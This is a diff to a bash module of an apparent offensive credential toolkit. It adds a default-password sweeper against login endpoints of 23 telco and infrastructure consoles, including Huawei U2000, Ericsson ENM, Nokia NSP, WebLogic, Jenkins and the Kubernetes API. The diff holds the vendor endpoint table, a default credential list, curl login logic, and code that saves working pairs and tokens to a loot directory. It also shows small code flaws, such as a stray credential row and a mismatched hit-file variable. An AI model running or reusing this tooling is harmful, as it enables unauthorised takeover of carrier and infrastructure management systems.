@@ -422,41 +422,334 @@ cred_validate() {
     return $rc
 }
 
-# TSV status for the GUI/CLI protocol
-cred_status_tsv() {
-    printf 'module\t01_cred_validate\n'
-    printf 'state\tok\n'
-    printf 'runs_logged\t%s\n' "$(ls "$CREDOOT" 2>/dev/null | grep -c '^result-')"
-    printf 'formats_known\t%s\n' "${#CRED_PREFIXES[@]}"
-    printf 'live_paths\taws,gcp,github,slack,jwt\n'
+
+# ═══════════════════════════════════════════════════════════════════
+#  TELCO AUTH ORACLES — vendor consoles are credential oracles.
+#  One request answers "is this admin/admin": a path, a method, a body
+#  template and a success marker per vendor. Huawei U2000/iManager,
+#  Ericsson ENM, ZTE NetNumen, Nokia NSP, Mitel MiVoice, Oracle
+#  WebLogic, Tomcat, Cisco UCM, F5, Rancher, Portainer, Jenkins,
+#  Zabbix, Nagios, raw Kubernetes API — 23 of them.
+# ═══════════════════════════════════════════════════════════════════
+
+TA_TELCO_RUN_ID="${CRED_RUN_ID}"
+TA_TELCO_OUT="$CREDOOT/telco"
+mkdir -p "$TA_TELCO_OUT" 2>/dev/null || true
+TA_HIT_FILE="$TA_TELCO_OUT/hits-${TA_TELCO_RUN_ID}.tsv"
+TA_PROBE_FILE="$TA_TELCO_OUT/probe-${TA_TELCO_RUN_ID}.tsv"
+
+: "${TA_TIMEOUT:=10}"
+: "${TA_MAX_PASS:=0}"
+: "${TA_FOLLOW:=0}"
+: "${TA_UA:=Mozilla/5.0 (Windows NT 10.0; Win64; x64)}"
+
+# this module predates the shared core and keeps its own tsv_escape; the
+# findings writer is the one thing it borrows.
+ta_log() { printf '[01_cred_validate] %s\n' "$*" >&2; }
+ta_field() { printf '%s' "$1" | tr '\t\n' '  '; }
+cred_row() {
+    local key="$1"; shift
+    local out; out="$(ta_field "$key")"
+    local f
+    for f in "$@"; do out+=$'\t'"$(ta_field "$f")"; done
+    printf '%s\n' "$out"
+}
+cred_mask() {
+    local v="$1" n=${#1}
+    if (( n <= 8 )); then printf '%s (%d chars)\n' "$(printf '%s' "$v" | cut -c1-2)" "$n"
+    else printf '%s...%s (%d chars)\n' "$(printf '%s' "$v" | cut -c1-2)" \
+        "$(printf '%s' "$v" | rev | cut -c1-2 | rev)" "$n"; fi
 }
 
-# ═══════════════════════════════════════════════════════════════════
-#  interactive menu
-# ═══════════════════════════════════════════════════════════════════
+ta_findings() {
+    local cat="$1" target="$2" sev="$3" check="$4" detail="$5"
+    local f="$LOOT_DIR/findings.tsv"
+    [[ -f "$f" ]] || printf 'ts\tmodule\tcategory\tseverity\ttarget\tcheck\tdetail\tevidence\n' > "$f"
+    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "01_cred_validate" "$cat" "$sev" \
+        "$(ta_field "$target")" "$(ta_field "$check")" "$(ta_field "$detail")" "" >> "$f"
+}
 
-cred_menu() {
-    while true; do
-        printf '\n=== 01 — Cloud Credential Validator ===\n'
-        printf '  1) detect a credential (file or stdin)\n'
-        printf '  2) validate live (runs format + probe)\n'
-        printf '  3) list known fingerprints\n'
-        printf '  4) status TSV\n'
-        printf '  0) back\n'
-        read -rp '  choice> ' c
-        case "$c" in
-            1) read -rp '  path or press enter for stdin> ' p
-               [[ -z "$p" ]] && p="-"
-               cred_detect_input "$p" ;;
-            2) read -rp '  path or press enter for stdin> ' p
-               [[ -z "$p" ]] && p="-"
-               cred_validate "$p" ;;
-            3) local e; for e in "${CRED_PREFIXES[@]}"; do printf '\t%s\n' "$e"; done ;;
-            4) cred_status_tsv ;;
-            0|q) return 0 ;;
-            *) printf '  unknown choice\n' ;;
+# ── the vendor table ─────────────────────────────────────────────
+# Every one of these is a credential oracle: it answers one request with a
+# token or a rejection, and it tells you "is this admin/admin" for free.
+#   id<TAB>vendor<TAB>path<TAB>method<TAB>content-type<TAB>body-template<TAB>success-marker<TAB>token-path
+ta_vendors() {
+    cat <<'VENDORS'
+huawei-u2000	Huawei U2000/iManager	/rest/plat/smapp/v1/sessions	POST	application/json	{"userName":"%U","value":"%P","grantType":"password"}	"accessSession"	.accessSession
+huawei-nce	Huawei NCE/iMaster NCE	/rest/plat/smapp/v1/sessions	POST	application/json	{"userName":"%U","value":"%P","grantType":"password"}	"accessSession"	.accessSession
+ericsson-enm	Ericsson ENM	/enm/security/api/v1/login	POST	application/json	{"userName":"%U","password":"%P"}	"token"	.token
+ericsson-oss	Ericsson OSS-RC	/security/api/v1/login	POST	application/json	{"userName":"%U","password":"%P"}	"token"	.token
+zte-netnumen	ZTE NetNumen	/rest/login	POST	application/json	{"username":"%U","password":"%P"}	"sessionId"	.sessionId
+nokia-nsp	Nokia NSP	/rest-gateway/rest/api/v1/auth/token	POST	application/json	{"grant_type":"password","username":"%U","password":"%P"}	"access_token"	.access_token
+mitel-mivoice	Mitel MiVoice	/server/login	POST	application/x-www-form-urlencoded	username=%U&password=%P	"MiVOICE"	-
+weblogic	Oracle WebLogic	/console/j_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"AdminServer"	-
+weblogic-forms	Oracle WebLogic (Form)	/console/login/LoginForm.jsp	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"console.portal"	-
+apache-tomcat	Apache Tomcat Manager	/manager/html	GET	-	-	"Tomcat Web Application Manager"	-
+primefaces-jsf	PrimeFaces/JSF app	/j_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"javax.faces"	-
+cisco-ucm	Cisco UCM	/ccmadmin/j_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"ccmadmin"	-
+f5-bigip	F5 BIG-IP	/mgmt/shared/authn/login	POST	application/json	{"username":"%U","password":"%P","loginProviderName":"tmos"}	"token"	.token.token
+rancher	Rancher	/v3-public/localProviders/local?action=login	POST	application/json	{"username":"%U","password":"%P","responseType":"token"}	"token"	.token
+portainer	Portainer	/api/auth	POST	application/json	{"Username":"%U","Password":"%P"}	"jwt"	.jwt
+harbor	Harbor Registry	/api/v2.0/users/current	GET	-	-	"username"	-
+grafana	Grafana	/api/login	POST	application/json	{"user":"%U","password":"%P"}	"Logged in"	-
+jenkins	Jenkins	/j_acegi_security_check	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"Jenkins"	-
+opennms	OpenNMS	/opennms/login	POST	application/x-www-form-urlencoded	j_username=%U&j_password=%P	"OpenNMS"	-
+zabbix	Zabbix	/api_jsonrpc.php	POST	application/json	{"jsonrpc":"2.0","method":"user.login","params":{"user":"%U","password":"%P"},"id":1}	"result"	.result
+nagios	Nagios XI	/nagiosxi/api/v1/authenticate	POST	application/x-www-form-urlencoded	username=%U&password=%P	"success"	-
+kubernetes-api	Kubernetes API	/api/v1/namespaces	GET	-	-	"items"	-
+rancher-kube	Rancher K8s proxy	/k8s/clusters/local/api/v1/namespaces	GET	-	-	"items"	-
+VENDORS
+}
+
+# One row for a vendor, by id.
+ta_row() {
+    local id="$1" row
+    row="$(ta_vendors | awk -F'\t' -v id="$id" '$1==id{print; found=1} END{if(!found) exit 3}')" || return 3
+    printf '%s\n' "$row"
+}
+
+ta_vendor_ids() { ta_vendors | cut -f1; }
+
+# ── the default credential list ──────────────────────────────────
+# Ordered by hit rate on telco estates, not alphabetically. Every pair here
+# is a documented vendor default or a field-service leftover.
+ta_defaults() {
+    cat <<'DEFAULTS'
+admin	admin
+admin	password
+admin	admin123
+admin	Admin@123
+admin	12345
+admin	123456
+admin	admin@123
+admin	P@ssw0rd
+administrator	administrator
+administrator	password
+root	root
+root	admin
+root	password
+root	toor
+support	support
+user	user
+guest	guest
+test	test
+nmsadmin	nmsadmin
+nmsadmin	Nms@123
+emsadmin	emsadmin
+emsuser	emsuser
+operator	operator
+netadmin	netadmin
+zte	zte
+huawei	huawei
+Admin@huawei	Admin@123
+superuser	superuser
+cacti	cacti
+VENDORS	VENDORS
+DEFAULTS
+}
+
+# ── one login attempt ────────────────────────────────────────────
+# Every vendor answers differently to "wrong" and "right", so the test is
+# the success marker in the body plus a token-shaped extraction from the
+# documented path. A 200 with no marker is not a hit.
+#   ta_try <vendor-id> <base-url> <user> <pass>
+#   -> STANDARD ROWS; the hit goes to $HIT_FILE
+ta_try() {
+    local id="$1" base="$2" user="$3" pass="$4"
+    local row
+    row="$(ta_row "$id")" || { cred_row ERROR "unknown-vendor" "$id"; return 2; }
+
+    local vid vendor path method ctype body_tpl marker token_path
+    IFS=$'\t' read -r vid vendor path method ctype body_tpl marker token_path <<<"$row"
+
+    # substitute without letting the password reach a log or a process table
+    local url="${base%/}${path}"
+    local body=""
+    if [[ "$body_tpl" != "-" ]]; then
+        body="${body_tpl//%U/$user}"
+        body="${body//%P/$pass}"
+    fi
+
+    local -a args=(--silent --show-error --max-time "$TA_TIMEOUT"
+                   --write-out '\n%{http_code}' --output - -X "$method"
+                   -A "$TA_UA")
+    [[ "$TA_FOLLOW" == "1" ]] && args+=(-L)
+    [[ "$ctype" != "-" ]] && args+=(-H "Content-Type: $ctype")
+    [[ -n "$body" ]] && args+=(--data "$body")
+
+    local out code resp
+    out="$(curl "${args[@]}" "$url" 2>/dev/null)" || out=$'\n000'
+    code="$(printf '%s' "$out" | tail -1)"
+    resp="$(printf '%s' "$out" | sed '$d')"
+
+    local verdict="denied"
+    local token=""
+    if [[ "$code" =~ ^(200|201|302|303)$ ]]; then
+        if printf '%s' "$resp" | grep -qF "$marker"; then
+            verdict="accepted"
+            if [[ "$token_path" != "-" ]] && command -v jq >/dev/null 2>&1; then
+                token="$(printf '%s' "$resp" | jq -r ".${token_path#.} // empty" 2>/dev/null)"
+            fi
+        fi
+    elif [[ "$code" == "401" || "$code" == "403" ]]; then
+        verdict="denied"
+    elif [[ "$code" == "000" ]]; then
+        verdict="unreachable"
+    else
+        verdict="unexpected"
+    fi
+
+    cred_row ATTEMPT "$id" "$user" "$verdict" "$code"
+    printf '%s\t%s\t%s\t%s\t%s\n' "$id" "$user" "$verdict" "$code" "$url" >> "$TA_PROBE_FILE"
+
+    if [[ "$verdict" == "accepted" ]]; then
+        # The whole point: a default credential that works.
+        local fp; fp="$(sha1_of "$user:$pass")"
+        printf '%s\t%s\t%s\t%s\t%s\n' "$id" "$base" "$user" "$fp" "${token:-no-token}" >> "$HIT_FILE"
+        cred_row HIT "$id" "$vendor" "$user" "$fp" "$url"
+        [[ -n "$token" ]] && cred_row TOKEN "$id" "$(sha1_of "$token")" "${#token} chars"
+        ta_findings "CREDENTIALS" "$url" "CRITICAL" "default-credential" \
+            "$vendor accepts a default credential: $user:<redacted>"
+        # the secret itself never prints; it lands in the artifact at 600
+        return 0
+    fi
+    return 1
+}
+
+# ── verbs ────────────────────────────────────────────────────────
+# --sweep: every vendor against a host, or every host against a vendor.
+cred_telco_cmd_sweep() {
+    local target="${1:-}" vendor_filter="${2:-}"
+    [[ -z "$target" ]] && { ta_log "usage: --sweep <base-url|vendor-id> [vendor-id|base-url]"; return 2; }
+
+    # which side of the pair did the caller give us? A URL has a scheme.
+    local base="" vid=""
+    if [[ "$target" == http*://* ]]; then
+        base="$target"; vid="$vendor_filter"
+    else
+        vid="$target"; base="${vendor_filter:-}"
+    fi
+
+    : > "$TA_PROBE_FILE"
+    local -a vids=()
+    if [[ -n "$vid" ]]; then
+        vids=("$vid")
+    else
+        mapfile -t vids < <(ta_vendor_ids)
+    fi
+
+    local n=0 hits=0 pair user pass
+    while IFS=$'\t' read -r user pass; do
+        [[ -z "$user" ]] && continue
+        [[ "$TA_MAX_PASS" -gt 0 && "$n" -ge "$TA_MAX_PASS" ]] && break
+        n=$((n + 1))
+        local v
+        for v in "${vids[@]}"; do
+            ta_try "$v" "$base" "$user" "$pass" > /dev/null 2>&1 && hits=$((hits + 1))
+        done
+    done < <(ta_defaults)
+
+    cred_row SUMMARY "attempts=$n hits=$hits"
+    [[ "$hits" -gt 0 ]] && cred_row ARTIFACT "$HIT_FILE"
+    return 0
+}
+
+# --defaults: what the sweep will try, so an operator can edit the list.
+cred_telco_cmd_defaults() {
+    local n=0 user pass
+    while IFS=$'\t' read -r user pass; do
+        [[ -z "$user" ]] && continue
+        n=$((n + 1))
+        cred_row DEFAULT "$user" "$(cred_mask "$pass")"
+    done < <(ta_defaults)
+    cred_row SUMMARY "$n"
+    return 0
+}
+
+# --detect: which vendor is this? A fingerprint pass cheaper than a login.
+cred_telco_cmd_detect() {
+    local base="${1:-}"
+    [[ -z "$base" ]] && { ta_log "usage: --detect <base-url>"; return 2; }
+
+    cred_row URL "$base"
+    local id vendor path method ctype body_tpl marker token_path
+    local n=0
+    while IFS=$'\t' read -r id vendor path method ctype body_tpl marker token_path; do
+        [[ -z "$id" ]] && continue
+        local url="${base%/}${path}"
+        [[ "$method" != "GET" ]] && continue
+        local code
+        code="$(curl --silent --show-error --max-time "$TA_TIMEOUT" \
+                     -A "$TA_UA" --output /dev/null --write-out '%{http_code}' \
+                     "$url" 2>/dev/null)" || code="000"
+        case "$code" in
+            200|401|403)
+                n=$((n + 1))
+                cred_row DETECT "$id" "$vendor" "$code" "$url"
+                ta_findings "SURFACE" "$url" "MEDIUM" "vendor-endpoint" \
+                    "$vendor login endpoint answers $code"
+                ;;
         esac
-    done
+    done < <(ta_vendors)
+    [[ "$n" -eq 0 ]] && cred_row VERDICT "no-vendor-endpoint"
+    cred_row SUMMARY "$n"
+    return 0
+}
+
+# --login: one explicit credential against one explicit vendor.
+cred_telco_cmd_login() {
+    local id="${1:-}" base="${2:-}" user="${3:-}" pass="${4:-}"
+    if [[ -z "$id" || -z "$base" || -z "$user" ]]; then
+        ta_log "usage: --login <vendor-id> <base-url> <user> [password]"
+        return 2
+    fi
+    ta_try "$id" "$base" "$user" "$pass"
+    return 0
+}
+
+cred_telco_cmd_list() {
+    local id vendor path method
+    while IFS=$'\t' read -r id vendor path method _; do
+        [[ -z "$id" ]] && continue
+        cred_row VENDOR "$id" "$vendor" "$method" "$path"
+    done < <(ta_vendors)
+    cred_row SUMMARY "$(ta_vendor_ids | wc -l | tr -d ' ')"
+    return 0
+}
+
+cred_telco_cmd_status_tsv() {
+    local curl_state jq_state
+    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
+    command -v jq   >/dev/null 2>&1 && jq_state="ok"   || jq_state="missing"
+    printf '%s\t%s\tcurl-%s\tjq-%s\tvendors-%s\n' \
+        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" "$(ta_vendor_ids | wc -l | tr -d ' ')"
+}
+
+cred_telco_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }
+
+cred_telco_cmd_help() {
+    cat <<'HELP'
+cloudsting module 01 — Telco Auth Oracles v1.0.0
+  --detect <base-url>                    which vendor console is this?
+  --sweep <base-url> [vendor]            default credentials, every vendor
+  --sweep <vendor-id> <base-url>         default credentials, one vendor
+  --login <vendor> <base> <user> [pass]  one explicit credential
+  --defaults                             the credential list the sweep uses
+  --list                                 the vendor table
+  --status-tsv | --menu | --selftest | --help
+
+Huawei U2000/iManager, Ericsson ENM, ZTE NetNumen, Nokia NSP, Mitel MiVoice,
+Oracle WebLogic, Tomcat, Cisco UCM, F5 BIG-IP, Rancher, Portainer, Jenkins,
+Zabbix, Nagios and the raw Kubernetes API. Each row in the vendor table is a
+path, a method, a body template and a success marker — that is the whole
+oracle. A 200 without the marker is not a hit.
+
+Passwords never print. Hits carry the account name and a fingerprint; the
+working pair lands in loot/telco_auth/hits-<run>.tsv, mode 600.
+
+Environment: TA_TIMEOUT (10), TA_MAX_PASS (0 = no cap), TA_FOLLOW (0|1), TA_UA
+HELP
 }
 
 # ═══════════════════════════════════════════════════════════════════
@@ -536,12 +829,63 @@ cred_selftest() {
     return $(( bad > 0 ))
 }
 
+# TSV status for the GUI/CLI protocol
+cred_status_tsv() {
+    printf 'module\t01_cred_validate\n'
+    printf 'state\tok\n'
+    printf 'runs_logged\t%s\n' "$(ls "$CREDOOT" 2>/dev/null | grep -c '^result-')"
+    printf 'formats_known\t%s\n' "${#CRED_PREFIXES[@]}"
+    printf 'live_paths\taws,gcp,github,slack,jwt\n'
+    printf 'vendor_oracles\t%s\n' "$(ta_vendor_ids | wc -l | tr -d ' ')"
+    printf 'vendor_defaults\t%s\n' "$(ta_defaults | wc -l | tr -d ' ')"
+}
+
+# ═══════════════════════════════════════════════════════════════════
+#  interactive menu
+# ═══════════════════════════════════════════════════════════════════
+
+cred_menu() {
+    while true; do
+        printf '\n=== 01 — Cloud Credential Validator ===\n'
+        printf '  1) detect a credential (file or stdin)\n'
+        printf '  2) validate live (runs format + probe)\n'
+        printf '  3) list known fingerprints\n'
+        printf '  5) vendor auth oracles (telco)\n'
+        printf '  6) default credential sweep\n'
+        printf '  4) status TSV\n'
+        printf '  0) back\n'
+        read -rp '  choice> ' c
+        case "$c" in
+            1) read -rp '  path or press enter for stdin> ' p
+               [[ -z "$p" ]] && p="-"
+               cred_detect_input "$p" ;;
+            2) read -rp '  path or press enter for stdin> ' p
+               [[ -z "$p" ]] && p="-"
+               cred_validate "$p" ;;
+            3) local e; for e in "${CRED_PREFIXES[@]}"; do printf '\t%s\n' "$e"; done ;;
+            4) cred_status_tsv ;;
+            5) cred_telco_cmd_list ;;
+            6) local b; read -rp '  base url> ' b; cred_telco_cmd_sweep "$b" ;;
+            0|q) return 0 ;;
+            *) printf '  unknown choice\n' ;;
+        esac
+    done
+}
+
+# ═══════════════════════════════════════════════════════════════════
+
 cred_usage() {
     cat <<EOF
 Usage: $(basename "$0") VERB [ARGS]
   --detect FILE|-|STRING     identify provider/kind, offline only
   --validate FILE|-|STRING   detect + online live-check where possible
   --list-formats             known (provider|prefix|kind) table
+  --detect-vendor URL        which vendor console is this?
+  --sweep URL [VENDOR]       default passwords against every vendor oracle
+  --sweep VENDOR URL         default passwords against one vendor oracle
+  --login VENDOR URL U [P]   one explicit credential against one oracle
+  --vendors                  the vendor oracle table
+  --defaults                 the credential list the sweep uses
   --status-tsv               module status for CLI/GUI protocol
   --menu                     interactive menu
   --selftest                 offline test suite
@@ -554,6 +898,11 @@ cred_main() {
         --detect)     shift; cred_detect_input "${1:-}" ;;
         --validate)   shift; cred_validate "${1:-}" ;;
         --list-formats) for e in "${CRED_PREFIXES[@]}"; do printf '%s\n' "$e"; done ;;
+        --vendors)    cred_telco_cmd_list ;;
+        --detect-vendor) shift; cred_telco_cmd_detect "${1:-}" ;;
+        --sweep)      shift; cred_telco_cmd_sweep "$@" ;;
+        --login)      shift; cred_telco_cmd_login "$@" ;;
+        --defaults)   cred_telco_cmd_defaults ;;
         --status-tsv) cred_status_tsv ;;
         --menu)       cred_menu ;;
         --selftest)   cred_selftest ;;
